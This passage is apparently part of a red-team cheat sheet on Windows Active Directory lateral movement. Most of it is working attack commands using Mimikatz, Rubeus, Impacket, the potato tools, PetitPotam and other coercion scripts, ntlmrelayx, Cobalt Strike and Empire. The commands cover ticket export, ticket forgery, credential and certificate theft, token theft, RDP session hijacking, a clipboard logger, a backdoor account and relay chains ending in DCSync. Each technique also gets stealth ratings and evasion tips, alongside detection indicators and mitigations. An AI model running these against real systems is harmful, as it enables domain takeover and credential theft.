- Tickets have expiration times

#### Export Tickets with Mimikatz

```powershell
# List all tickets
mimikatz.exe "sekurlsa::tickets" "exit"

# Export all tickets
mimikatz.exe "sekurlsa::tickets /export" "exit"

# Export specific ticket
mimikatz.exe "kerberos::list /export" "exit"
```

#### Export Tickets with Rubeus

```powershell
# Dump all tickets (current user)
Rubeus.exe dump

# Dump all tickets (all users, requires elevation)
Rubeus.exe dump /service:krbtgt /nowrap

# Dump specific LUID
Rubeus.exe dump /luid:0x3e7 /nowrap

# Monitor for new tickets (4624 logons)
Rubeus.exe monitor /interval:1
```

#### Inject Tickets (Mimikatz)

```powershell
# Inject single ticket
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

# Inject all tickets in directory
mimikatz.exe "kerberos::ptt /directory:C:\temp\tickets" "exit"

# Verify injection
klist
```

#### Inject Tickets (Rubeus)

```powershell
# PTT with Rubeus
Rubeus.exe ptt /ticket:BASE64_TICKET

# PTT from file
Rubeus.exe ptt /ticket:ticket.kirbi

# Create sacrificial process and inject
Rubeus.exe createnetonly /program:cmd.exe /domain:CORP /username:user /password:FakePass /ticket:BASE64_TICKET
```

#### Linux Ticket Operations

```bash
# Convert kirbi to ccache
ticketConverter.py ticket.kirbi ticket.ccache

# Set ticket for use
export KRB5CCNAME=/tmp/ticket.ccache

# Use ticket with Impacket
psexec.py -k -no-pass DOMAIN/user@TARGET-PC

# Extract tickets from Linux
getTGT.py DOMAIN/user:password -dc-ip DC-IP
export KRB5CCNAME=user.ccache
```

**Golden Ticket** (Domain Compromise):
```powershell
# Create golden ticket (requires krbtgt hash)
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /user:Administrator /id:500 /ptt" "exit"

# Rubeus golden ticket
Rubeus.exe golden /rc4:KRBTGT_HASH /domain:corp.local /sid:S-1-5-21-... /user:Administrator /ptt
```

**Silver Ticket** (Service-specific):
```powershell
# Create silver ticket (requires service account hash)
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:SERVER.corp.local /service:cifs /rc4:SERVICE_HASH /user:Administrator /ptt" "exit"

# Rubeus silver ticket
Rubeus.exe silver /service:cifs/SERVER.corp.local /rc4:SERVICE_HASH /user:Administrator /domain:corp.local /sid:S-1-5-21-... /ptt
```

**OpSec Considerations**:
- Tickets have expiration (default 10 hours for TGT)
- Golden tickets create non-standard ticket properties (detectable)
- Ticket reuse from different IPs suspicious
- **Stealth Rating**: 7/10 (PTT), 4/10 (Golden/Silver)

**Detection Indicators**:
- Event ID 4768: Kerberos TGT requested (unusual properties for golden tickets)
- Event ID 4769: Kerberos service ticket requested
- Event ID 4770: Kerberos service ticket renewed
- Event ID 4771: Kerberos pre-authentication failed
- Tickets with unusual lifetimes or properties
- Downgrade from AES to RC4 encryption
- Account logon from unusual locations

---

### Overpass-the-Hash (Pass-the-Key)

**MITRE ATT&CK**: T1550.002 (Use Alternate Authentication Material: Pass the Hash)

**Mechanism**:
- Uses NTLM hash or AES key to request Kerberos TGT
- Converts NTLM authentication to Kerberos
- Bypasses systems that only allow Kerberos
- Also known as "Pass-the-Key"

#### Rubeus Overpass-the-Hash

```powershell
# Using NTLM hash
Rubeus.exe asktgt /user:Administrator /domain:corp.local /rc4:NTLM_HASH /ptt

# Using AES256 key (preferred, less detectable)
Rubeus.exe asktgt /user:Administrator /domain:corp.local /aes256:AES_KEY /ptt /nowrap

# Without PTT (just request TGT)
Rubeus.exe asktgt /user:Administrator /domain:corp.local /rc4:NTLM_HASH /nowrap

# Specify DC
Rubeus.exe asktgt /user:Administrator /domain:corp.local /rc4:NTLM_HASH /dc:DC01.corp.local /ptt
```

#### Mimikatz Overpass-the-Hash

```powershell
# Using NTLM hash
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:NTLM_HASH /run:powershell.exe" "exit"

# In the spawned PowerShell, request TGT
klist purge
.\PsExec.exe \\TARGET-PC cmd
# This triggers TGT request using the injected hash
```

#### Impacket getTGT.py

```bash
# Request TGT using NTLM hash
getTGT.py DOMAIN/user -hashes :NTLM_HASH

# Request TGT using AES key
getTGT.py DOMAIN/user -aesKey AES_KEY

# Use the resulting ticket
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass DOMAIN/user@TARGET-PC
```

**OpSec Considerations**:
- Creates standard Kerberos authentication flow
- Less anomalous than PTH over NTLM
- AES keys preferred over RC4/NTLM (less detectable)
- **Stealth Rating**: 8/10

**Detection Indicators**:
- Event ID 4768: TGT request (check for encryption downgrade)
- Event ID 4769: Service ticket request
- Unusual account activity patterns
- Encryption type downgrade (AES → RC4)

---

### Pass-the-Certificate

**MITRE ATT&CK**: T1649 (Steal or Forge Authentication Certificates)

**Mechanism**:
- Uses stolen/forged certificates for Kerberos authentication (PKINIT)
- Requires certificate with Client Authentication EKU
- Can be used for persistence (certificates often long-lived)
- Bypasses password changes

#### Certificate Theft

```powershell
# Enumerate certificates
certutil -store -user My

# Export certificate (Mimikatz)
mimikatz.exe "crypto::certificates /export" "exit"

# SharpDPAPI certificate extraction
SharpDPAPI.exe certificates /machine
```

#### Certificate Authentication (Rubeus)

```powershell
# Request TGT using certificate
Rubeus.exe asktgt /user:Administrator /domain:corp.local /certificate:CERT.pfx /password:CERT_PASSWORD /ptt

# Using base64 certificate
Rubeus.exe asktgt /user:Administrator /domain:corp.local /certificate:BASE64_CERT /ptt /nowrap
```

#### Schannel Authentication

```powershell
# Use certificate for LDAPS authentication
# Requires certificate with Client Authentication EKU
# Automatically used by Windows if available in personal certificate store
```

#### Certificate Forgery (Requires CA Compromise)

```powershell
# ForgeCert (create fake certificate)
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject "CN=User" --SubjectAltName "user@corp.local" --NewCertPath user.pfx --NewCertPassword Password123

# Use forged certificate
Rubeus.exe asktgt /user:user /domain:corp.local /certificate:user.pfx /password:Password123 /ptt
```

**OpSec Considerations**:
- Certificates rarely monitored
- Long expiration times (persistence)
- Requires PKI infrastructure
- **Stealth Rating**: 9/10

**Detection Indicators**:
- Event ID 4768: TGT requested with PKINIT pre-authentication
- Event ID 4887: Certificate Services approved certificate request
- Unusual certificate issuance or usage
- Certificate from untrusted CA

---

## Token Manipulation

### Token Types and Structure

**MITRE ATT&CK**: T1134 (Access Token Manipulation)

**Token Types**:
- **Primary Token**: Associated with user account, created at logon
- **Impersonation Token**: Temporary, created to impersonate security context
  - SecurityAnonymous (Level 0): No impersonation
  - SecurityIdentification (Level 1): Query only
  - SecurityImpersonation (Level 2): Local impersonation
  - SecurityDelegation (Level 3): Network impersonation (Kerberos delegation)

**Token Privileges** (Relevant for Security):
- `SeDebugPrivilege`: Debug programs (LSASS access)
- `SeImpersonatePrivilege`: Impersonate clients (SYSTEM escalation)
- `SeAssignPrimaryTokenPrivilege`: Replace process-level token
- `SeBackupPrivilege`: Backup files (read any file)
- `SeRestorePrivilege`: Restore files (write any file)
- `SeTakeOwnershipPrivilege`: Take ownership of objects
- `SeLoadDriverPrivilege`: Load kernel drivers

---

### Token Theft from Processes

#### Enumerate Tokens (Incognito)

```powershell
# Metasploit Incognito
meterpreter> load incognito
meterpreter> list_tokens -u

# List delegation tokens
meterpreter> list_tokens -g
```

#### Steal Token (Incognito)

```powershell
# Impersonate user token
meterpreter> impersonate_token "DOMAIN\\Administrator"

# Impersonate by token ID
meterpreter> steal_token <PID>
```

#### Mimikatz Token Manipulation

```powershell
# List all tokens
mimikatz.exe "token::list" "exit"

# Elevate to SYSTEM token
mimikatz.exe "token::elevate" "exit"

# Elevate to specific user token
mimikatz.exe "token::elevate /domainadmin" "exit"

# Impersonate token
mimikatz.exe "token::run /user:DOMAIN\Administrator cmd.exe" "exit"
```

#### PowerShell Token Theft (Invoke-TokenManipulation)

```powershell
# List available tokens
Invoke-TokenManipulation -Enumerate

# Create process with token from another process
Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId <PID>

# Impersonate user
Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\Administrator"

# Revert to self
Invoke-TokenManipulation -RevToSelf
```

---

### CreateProcessWithToken

**Mechanism**:
- Creates new process using stolen token
- Requires `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`
- Common in service account exploitation

```powershell
# Using PowerShell (manual implementation)
# 1. Open process with TOKEN_DUPLICATE | TOKEN_QUERY
# 2. DuplicateTokenEx to create primary token
# 3. CreateProcessWithTokenW to spawn process with token

# Simplified with tools
Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 1234
```

---

### Named Pipe Impersonation

**MITRE ATT&CK**: T1134.001 (Access Token Manipulation: Token Impersonation/Theft)

**Mechanism**:
- Create named pipe
- Trick SYSTEM process into connecting
- Impersonate SYSTEM token from pipe
- Requires `SeImpersonatePrivilege` (service accounts have this)

#### PrintSpoofer

```powershell
# Basic privilege escalation
PrintSpoofer.exe -i -c cmd.exe

# Execute command as SYSTEM
PrintSpoofer.exe -c "whoami"

# Specify pipe name
PrintSpoofer.exe -i -p "\\.\pipe\mypipe" -c cmd.exe
```

#### RoguePotato

```powershell
# Basic execution
RoguePotato.exe -r 192.168.1.100 -l 9999 -e cmd.exe

# With redirector
# On attacker machine:
socat tcp-listen:135,reuseaddr,fork tcp:192.168.1.100:9999

# On victim:
RoguePotato.exe -r 192.168.1.100 -l 9999 -e "cmd.exe"
```

#### JuicyPotato (Older Windows)

```powershell
# Specify CLSID (COM object)
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}

# Common CLSIDs available in tool documentation
```

#### GodPotato (Windows Server 2012+)

```powershell
# Simple execution
GodPotato.exe -cmd "cmd.exe"

# Execute command
GodPotato.exe -cmd "net user hacker Password123 /add"
```

**OpSec Considerations**:
- Named pipe creation detectable
- Requires `SeImpersonatePrivilege`
- Often used for privilege escalation rather than lateral movement
- **Stealth Rating**: 5/10

**Detection Indicators**:
- Sysmon Event ID 17/18: Pipe created/connected
- Event ID 4688: Suspicious process creation from service account
- Unusual child processes from services

---

### Token Privilege Escalation

#### Enable Token Privileges

```powershell
# PowerShell method
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class TokenManipulator {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public int PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES {
        public LUID Luid;
        public int Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public int LowPart;
        public int HighPart;
    }
}
"@

# Enable SeDebugPrivilege (simplified - use existing tools)
# Use Mimikatz or dedicated privilege escalation tools
```

#### Mimikatz Privilege Escalation

```powershell
# Enable all privileges
mimikatz.exe "privilege::debug" "token::elevate" "exit"

# Specific privilege
mimikatz.exe "privilege::debug" "exit"
```

---

## Remote Desktop Abuse

### RDP Session Hijacking

**MITRE ATT&CK**: T1563.002 (Remote Service Session Hijacking: RDP Hijacking)

**Mechanism**:
- Windows allows session switching via `tscon.exe`
- SYSTEM can hijack any session without password
- Requires local admin or SYSTEM privileges

#### Enumerate Sessions

```powershell
# Query RDP sessions
query user

# Detailed session info
qwinsta
```

#### Hijack Session (As SYSTEM)

```powershell
# Method 1: Direct hijack (requires SYSTEM)
# Elevate to SYSTEM first
PsExec.exe -s cmd.exe

# Hijack session ID 2
tscon 2 /dest:console

# Method 2: Create service to hijack
sc create sesshijack binPath= "cmd.exe /c tscon 2 /dest:rdp-tcp#0"
sc start sesshijack
sc delete sesshijack
```

#### Hijack with Mimikatz

```powershell
# Elevate and hijack
mimikatz.exe "privilege::debug" "token::elevate" "ts::sessions" "ts::remote /id:2" "exit"
```

**OpSec Considerations**:
- Disconnects legitimate user (noticeable)
- Logged in event logs
- Requires SYSTEM privileges
- **Stealth Rating**: 3/10

**Detection Indicators**:
- Event ID 4778/4779: Session connected/disconnected
- Event ID 4624: Logon Type 10 (RemoteInteractive)
- Event ID 25: TerminalServices-LocalSessionManager (session reconnection)
- Sysmon Event ID 1: tscon.exe execution

---

### Restricted Admin Mode PTH

**Mechanism**:
- Restricted Admin mode prevents credential delegation to RDP server
- Allows PTH for RDP authentication
- Must be enabled on target system

#### Enable Restricted Admin

```powershell
# Enable on target (requires admin)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Verify setting
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
```

#### Connect with PTH

```bash
# xfreerdp from Linux
xfreerdp /u:Administrator /pth:NTLM_HASH /v:192.168.1.100 /cert-ignore

# With domain
xfreerdp /u:DOMAIN\\Administrator /pth:NTLM_HASH /v:192.168.1.100 /cert-ignore
```

```powershell
# Mimikatz on Windows
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:CORP /ntlm:NTLM_HASH /run:'mstsc.exe /restrictedadmin'" "exit"
```

**OpSec Considerations**:
- Requires Restricted Admin mode enabled
- Standard RDP logs generated
- **Stealth Rating**: 6/10

---

### RDP Shadowing

**MITRE ATT&CK**: T1021.001 (Remote Services: Remote Desktop Protocol)

**Mechanism**:
- Windows allows shadowing (viewing/controlling) RDP sessions
- Requires admin privileges
- Can be stealthy (user may not notice)

#### Shadow Session

```powershell
# View session without control
mstsc /shadow:2 /noConsentPrompt

# View with control
mstsc /shadow:2 /control /noConsentPrompt

# Alternative: query user then shadow
query user
mstsc /v:TARGET-PC /shadow:2 /control
```

**Requirements**:
- Group Policy: `Configure rules for remote control of Remote Desktop Services user sessions`
- Registry: `HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services`
  - `Shadow`: 2 (View session with user's permission), 1 (Full Control with user's permission), 4 (View without permission), 3 (Full Control without permission)

**OpSec Considerations**:
- Can be configured to not prompt user
- Low visibility if configured correctly
- **Stealth Rating**: 7/10

---

### Clipboard Data Theft

**Mechanism**:
- RDP shares clipboard between client and server
- Clipboard data can be intercepted
- Passive data collection

#### Monitor Clipboard

```powershell
# PowerShell clipboard monitoring
while ($true) {
    $clip = Get-Clipboard -Raw
    if ($clip -ne $lastClip) {
        $clip | Out-File -Append C:\temp\clipboard.txt
        $lastClip = $clip
    }
    Start-Sleep -Seconds 1
}
```

---

### RDP Credential Theft

#### Default RDP Credentials

```powershell
# Enumerate saved RDP credentials
cmdkey /list

# DPAPI-protected RDP credentials
dir C:\Users\*\AppData\Local\Microsoft\Credentials /s

# Decrypt with Mimikatz/SharpDPAPI
SharpDPAPI.exe rdg
```

#### RDCMan.settings (RDP Connection Manager)

```powershell
# RDCMan stores credentials in settings file
# Location: %USERPROFILE%\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings

# Decrypt with tools
# Credentials encrypted with DPAPI
```

---

## Network Authentication

### SMB Authentication Flows

**Mechanism**:
- SMB uses NTLM or Kerberos authentication
- Default SMB ports: 445 (SMB), 139 (NetBIOS)
- Supports signing and encryption

**Authentication Flow**:
1. Client connects to `\\SERVER\SHARE`
2. Server challenges client (NTLM) or requests Kerberos ticket
3. Client responds with hash/ticket
4. Server validates credentials
5. Access granted/denied

**SMB Signing**:
- Prevents relay attacks
- Required by default on Domain Controllers
- Optional on workstations/servers

```powershell
# Check SMB signing status
Get-SmbConnection
Get-SmbServerConfiguration | Select RequireSecuritySignature

# Enable SMB signing (requires reboot)
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
```

**SMB Versions**:
- SMBv1: Deprecated, vulnerable
- SMBv2: Improved performance
- SMBv3: Encryption support

```powershell
# Check SMB version
Get-SmbConnection

# Disable SMBv1
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
```

---

### LDAP Bind Types

**Mechanism**:
- LDAP authentication to Active Directory
- Default ports: 389 (LDAP), 636 (LDAPS), 3268/3269 (Global Catalog)

**Bind Types**:
1. **Simple Bind**: Plaintext username/password (insecure over non-SSL)
2. **Simple Bind over SSL**: Encrypted (LDAPS port 636)
3. **SASL Bind**: Multiple mechanisms (NTLM, Kerberos, Digest)
4. **Anonymous Bind**: No credentials (often disabled)

```powershell
# Test LDAP bind
$ldap = New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC01.corp.local", "DOMAIN\user", "password")
$ldap.distinguishedName

# LDAPS bind
$ldaps = New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC01.corp.local:636", "DOMAIN\user", "password")
```

**LDAP Signing**:
- Prevents tampering and relay attacks
- Can be required by Group Policy

```powershell
# Check LDAP signing requirement (on DC)
reg query "HKLM\System\CurrentControlSet\Services\NTDS\Parameters" /v LDAPServerIntegrity
# 0 = None, 1 = Negotiate, 2 = Require
```

---

### WinRM Authentication

**Mechanism**:
- WinRM uses Kerberos or NTLM
- Supports CredSSP for credential delegation
- Default ports: 5985 (HTTP), 5986 (HTTPS)

**Authentication Methods**:
1. **Kerberos**: Default in domain environments
2. **CredSSP**: Allows credential delegation (double-hop)
3. **Certificate**: Certificate-based authentication
4. **Negotiate**: Kerberos with NTLM fallback
5. **Basic**: Base64-encoded credentials (insecure)

```powershell
# Configure WinRM authentication
Set-Item WSMan:\localhost\Service\Auth\Kerberos -Value $true
Set-Item WSMan:\localhost\Service\Auth\CredSSP -Value $true
Set-Item WSMan:\localhost\Service\Auth\Certificate -Value $true

# Client CredSSP configuration
Enable-WSManCredSSP -Role Client -DelegateComputer "*.corp.local"

# Server CredSSP configuration
Enable-WSManCredSSP -Role Server
```

**Double-Hop Problem**:
- Credentials not delegated by default
- CredSSP or Kerberos delegation required

```powershell
# CredSSP solution
Invoke-Command -ComputerName SRV01 -Authentication CredSSP -Credential $cred -ScriptBlock {
    # Now can authenticate to third system
    Invoke-Command -ComputerName SRV02 -ScriptBlock { whoami }
}
```

---

### RPC Authentication

**Mechanism**:
- RPC (Remote Procedure Call) used by many Windows services
- Default port: 135 (endpoint mapper) + dynamic high ports
- Supports multiple authentication protocols

**RPC Authentication Levels**:
1. **RPC_C_AUTHN_LEVEL_NONE**: No authentication
2. **RPC_C_AUTHN_LEVEL_CONNECT**: Authenticate on connection
3. **RPC_C_AUTHN_LEVEL_CALL**: Authenticate each call
4. **RPC_C_AUTHN_LEVEL_PKT**: Authenticate packets
5. **RPC_C_AUTHN_LEVEL_PKT_INTEGRITY**: Packet integrity
6. **RPC_C_AUTHN_LEVEL_PKT_PRIVACY**: Packet encryption

**Services Using RPC**:
- DCOM
- WMI
- Task Scheduler
- Service Control Manager
- SAM/LSA

---

### Kerberos vs NTLM Negotiation

**Kerberos (Preferred)**:
- Ticket-based authentication
- Mutual authentication
- Supports delegation
- Requires time synchronization (5 min default)
- Requires SPN resolution

**NTLM (Fallback)**:
- Challenge-response protocol
- No mutual authentication
- No delegation support
- Works without time sync
- Works without DNS/SPN

**Negotiation Process**:
1. Client attempts Kerberos
2. If Kerberos fails (SPN not found, time skew, etc.), falls back to NTLM
3. NTLM authentication proceeds

```powershell
# Force Kerberos
# Ensure proper SPN registration
setspn -Q HTTP/server.corp.local

# Force NTLM (for testing)
# Access by IP instead of hostname
\\192.168.1.100\C$
```

**Detection of NTLM Usage** (to identify weak spots):
```powershell
# Enable NTLM auditing
auditpol /set /subcategory:"Logon" /success:enable /failure:enable

# Event ID 4776: NTLM authentication
# Event ID 4624 with Authentication Package: NTLM
```

---

## Coercion Attacks

### PetitPotam - EFS RPC Abuse

**MITRE ATT&CK**: T1187 (Forced Authentication)

**Mechanism**:
- Abuses MS-EFSRPC (Encrypting File System Remote Protocol)
- Forces target computer account to authenticate to attacker
- Can be relayed to ADCS (Active Directory Certificate Services) for privilege escalation
- Requires no credentials (unauthenticated) in some implementations

#### PetitPotam Execution

```bash
# Unauthenticated coercion (original vulnerability)
python3 PetitPotam.py -u '' -p '' 192.168.1.200 192.168.1.100
# 192.168.1.200: Attacker (relay listener)
# 192.168.1.100: Target (victim that will authenticate)

# Authenticated coercion (more reliable)
python3 PetitPotam.py -d DOMAIN -u user -p password 192.168.1.200 192.168.1.100

# Target specific pipe
python3 PetitPotam.py -pipe lsarpc 192.168.1.200 192.168.1.100

# Relay to ADCS (for certificate extraction)
# Terminal 1: Start ntlmrelayx
ntlmrelayx.py -t http://CA-SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Terminal 2: Coerce authentication
python3 PetitPotam.py 192.168.1.200 DC01.corp.local
```

**Mitigation**:
- KB5005413 (August 2021) - Patches unauthenticated calls
- Disable NTLM authentication on Domain Controllers
- Enable EPA (Extended Protection for Authentication) on AD CS
- Disable WebEnrollment on ADCS

**OpSec Considerations**:
- Extremely loud (generates authentication attempts)
- Often blocked by patches
- **Stealth Rating**: 2/10

**Detection Indicators**:
- Event ID 5145: Network share access to `\\target\IPC$`
- Event ID 4624: Logon Type 3 from unexpected source
- RPC calls to MS-EFSRPC interface
- Unusual authentication patterns from computer accounts

---

### PrinterBug / SpoolSample

**MITRE ATT&CK**: T1187 (Forced Authentication)

**Mechanism**:
- Abuses Print Spooler service (spoolsv.exe)
- RpcRemoteFindFirstPrinterChangeNotification function forces authentication
- Default Windows service (often enabled)
- Requires Print Spooler service running on target

#### SpoolSample Execution

```bash
# Basic coercion
SpoolSample.exe TARGET-PC ATTACKER-IP

# Full command
SpoolSample.exe DC01.corp.local 192.168.1.200

# With Rubeus (capture TGT)
# Terminal 1: Monitor for TGT
Rubeus.exe monitor /interval:1

# Terminal 2: Trigger coercion
SpoolSample.exe DC01 ATTACKER-HOSTNAME
```

#### PrinterBug.py (Linux)

```bash
# Python implementation
python3 printerbug.py DOMAIN/user:password@TARGET-PC ATTACKER-IP

# Example
python3 printerbug.py corp.local/user:password@DC01.corp.local 192.168.1.200
```

#### Relay Attack Chain

```bash
# Setup relay to SMB
ntlmrelayx.py -t smb://TARGET-SERVER -smb2support

# Trigger PrinterBug
python3 printerbug.py corp.local/user:password@VICTIM 192.168.1.200

# Alternative: Relay to LDAP for ACL modifications
ntlmrelayx.py -t ldap://DC01.corp.local --escalate-user lowpriv
python3 printerbug.py corp.local/user:password@DC01.corp.local 192.168.1.200
```

**Mitigation**:
- Disable Print Spooler service (if not needed)
  ```powershell
  Stop-Service -Name Spooler -Force
  Set-Service -Name Spooler -StartupType Disabled
  ```
- Enable SMB signing
- Disable NTLM authentication

**OpSec Considerations**:
- Print Spooler service must be running
- Creates authentication logs
- **Stealth Rating**: 4/10

**Detection Indicators**:
- Event ID 4624: Logon Type 3 from unusual source
- Event ID 5145: Network share access
- Unusual Print Spooler activity
- Sysmon Event ID 3: Network connection from spoolsv.exe

---

### DFSCoerce - DFS-R Abuse

**MITRE ATT&CK**: T1187 (Forced Authentication)

**Mechanism**:
- Abuses MS-DFSNM (Distributed File System Namespace Management Protocol)
- Forces target to authenticate via DFS RPC calls
- Works on systems with DFS service

#### DFSCoerce Execution

```bash
# Basic coercion
python3 dfscoerce.py -u user -p password -d DOMAIN ATTACKER-IP TARGET-PC

# Example
python3 dfscoerce.py -u user -p password -d corp.local 192.168.1.200 DC01.corp.local

# Relay attack
# Terminal 1:
ntlmrelayx.py -t ldap://DC01.corp.local --escalate-user lowpriv

# Terminal 2:
python3 dfscoerce.py -u user -p password -d corp.local 192.168.1.200 DC01.corp.local
```

**Mitigation**:
- Disable DFS service if not required
- SMB signing enforcement
- LDAP signing and channel binding

**OpSec Considerations**:
- Less commonly used (potentially lower detection)
- Requires DFS service
- **Stealth Rating**: 5/10

---

### ShadowCoerce - Volume Shadow Copy Abuse

**MITRE ATT&CK**: T1187 (Forced Authentication)

**Mechanism**:
- Abuses MS-FSRVP (File Server Remote VSS Protocol)
- Forces authentication via Shadow Copy RPC calls
- Targets file servers and systems with VSS enabled

#### ShadowCoerce Execution

```bash
# Basic coercion
python3 shadowcoerce.py -u user -p password -d DOMAIN ATTACKER-IP TARGET-PC

# Example
python3 shadowcoerce.py -u user -p password -d corp.local 192.168.1.200 FILE-SERVER.corp.local

# Combined with relay
ntlmrelayx.py -t smb://TARGET-DC -smb2support
python3 shadowcoerce.py -u user -p password -d corp.local 192.168.1.200 FILE-SERVER.corp.local
```

**Mitigation**:
- Disable File Server VSS Agent Service if not needed
- Network segmentation
- SMB signing

**OpSec Considerations**:
- Targets file servers specifically
- Less common attack vector
- **Stealth Rating**: 6/10

---

### Coercer.py - Multi-Method Coercion Tool

**Mechanism**:
- Combines multiple coercion techniques in one tool
- Automated testing of various RPC abuse methods
- Supports PetitPotam, PrinterBug, DFSCoerce, and more

#### Coercer Execution

```bash
# Scan for available coercion methods
python3 Coercer.py scan -u user -p password -d DOMAIN -t TARGET-PC

# Coerce with all methods
python3 Coercer.py coerce -u user -p password -d DOMAIN -l ATTACKER-IP -t TARGET-PC

# Specific method
python3 Coercer.py coerce -u user -p password -d DOMAIN -l ATTACKER-IP -t TARGET-PC --method PrinterBug

# Filter methods
python3 Coercer.py coerce -u user -p password -d DOMAIN -l ATTACKER-IP -t TARGET-PC --filter-method-name MS-RPRN
```

**Available Methods**:
- MS-RPRN (PrinterBug)
- MS-EFSRPC (PetitPotam)
- MS-DFSNM (DFSCoerce)
- MS-FSRVP (ShadowCoerce)
- MS-EFSR (Additional EFS methods)

**OpSec Considerations**:
- Automated scanning is noisy
- Selective method usage recommended
- **Stealth Rating**: 3/10 (scan), 5/10 (targeted)

---

### Relay Targets and Strategies

#### NTLM Relay Targets

1. **SMB Relay**
   ```bash
   # Relay to SMB for command execution
   ntlmrelayx.py -t smb://192.168.1.100 -smb2support -c "whoami"

   # Dump SAM
   ntlmrelayx.py -t smb://192.168.1.100 -smb2support --sam
   ```

2. **LDAP/LDAPS Relay**
   ```bash
   # Escalate user privileges
   ntlmrelayx.py -t ldap://DC01.corp.local --escalate-user lowpriv

   # Add user to group
   ntlmrelayx.py -t ldap://DC01.corp.local --add-computer

   # Delegate access
   ntlmrelayx.py -t ldaps://DC01.corp.local --delegate-access
   ```

3. **ADCS (Certificate Services) Relay**
   ```bash
   # Request certificate
   ntlmrelayx.py -t http://CA-SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

   # Use certificate for authentication
   # See Pass-the-Certificate section
   ```

4. **HTTP/HTTPS Relay**
   ```bash
   # Relay to web applications
   ntlmrelayx.py -t https://webapp.corp.local -smb2support
   ```

#### Relay Attack Chain Example

```bash
# Full privilege escalation chain via ADCS

# Step 1: Setup relay to ADCS
ntlmrelayx.py -t http://CA-SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Step 2: Coerce DC authentication (PetitPotam/PrinterBug)
python3 PetitPotam.py 192.168.1.200 DC01.corp.local

# Step 3: Receive certificate in ntlmrelayx output
# Certificate saved to: DC01.pfx

# Step 4: Request TGT with certificate
python3 gettgtpkinit.py -cert-pfx DC01.pfx -dc-ip 192.168.1.10 corp.local/DC01$ DC01.ccache

# Step 5: DCSync with TGT
export KRB5CCNAME=DC01.ccache
secretsdump.py -k -no-pass corp.local/DC01$@DC01.corp.local -just-dc
```

**Relay Prevention**:
- SMB Signing (required)
- LDAP Signing (required)
- LDAP Channel Binding
- EPA (Extended Protection for Authentication)
- Disable NTLM where possible

---

## C2 Frameworks

### Cobalt Strike Lateral Movement

**MITRE ATT&CK**: T1071 (Application Layer Protocol), T1021 (Remote Services)

#### Jump Commands

```
# PsExec
beacon> jump psexec TARGET-PC listener_name

# PsExec (alternate admin share)
beacon> jump psexec_psh TARGET-PC listener_name

# WMI
beacon> jump winrm TARGET-PC listener_name
beacon> jump winrm64 TARGET-PC listener_name

# WinRM / PowerShell Remoting
beacon> jump psexec TARGET-PC listener_name
```

#### Remote-Exec Commands

```
# Execute command via WMI
beacon> remote-exec wmi TARGET-PC whoami

# Execute via PsExec
beacon> remote-exec psexec TARGET-PC whoami

# Execute via WinRM
beacon> remote-exec winrm TARGET-PC whoami
```

#### PTH in Cobalt Strike

```
# Create sacrificial process with hash
beacon> pth DOMAIN\user NTLM_HASH

# Spawn beacon on remote system
beacon> spawn x64 smb
beacon> remote-exec psexec TARGET-PC \\.\pipe\msagent_12

# Pass-the-Ticket
beacon> kerberos_ticket_use /path/to/ticket.kirbi
beacon> ls \\TARGET-PC\C$
```

#### Spawn and Inject

```
# Spawn beacon on remote system (SMB pivot)
beacon> spawn x64 smb

# Link to SMB beacon
beacon> link TARGET-PC PIPENAME

# Inject into remote process
beacon> inject <PID> x64 listener_name
```

**OpSec Considerations**:
- Default indicators well-known to EDR
- Custom malleable C2 profiles recommended
- Named pipes and service names should be randomized
- **Stealth Rating**: 4/10 (default), 7/10 (customized)

---

### PowerShell Empire

#### Lateral Movement Modules

```powershell
# Invoke-PsExec
(Empire) > usemodule lateral_movement/invoke_psexec
(Empire: invoke_psexec) > set ComputerName TARGET-PC
(Empire: invoke_psexec) > set Listener http
(Empire: invoke_psexec) > execute

# Invoke-WMI
(Empire) > usemodule lateral_movement/invoke_wmi
(Empire: invoke_wmi) > set ComputerName TARGET-PC
(Empire: invoke_wmi) > set Listener http
(Empire: invoke_wmi) > execute

# Invoke-DCOM
(Empire) > usemodule lateral_movement/invoke_dcom
(Empire: invoke_dcom) > set ComputerName TARGET-PC
(Empire: invoke_dcom) > set Method MMC20.Application
(Empire: invoke_dcom) > execute

# Invoke-PowerShellRemoting
(Empire) > usemodule lateral_movement/invoke_psremoting
(Empire: invoke_psremoting) > set ComputerName TARGET-PC
(Empire: invoke_psremoting) > execute
```

#### Credential Usage

```powershell
# Store credentials
(Empire) > usemodule credentials/credential_injection
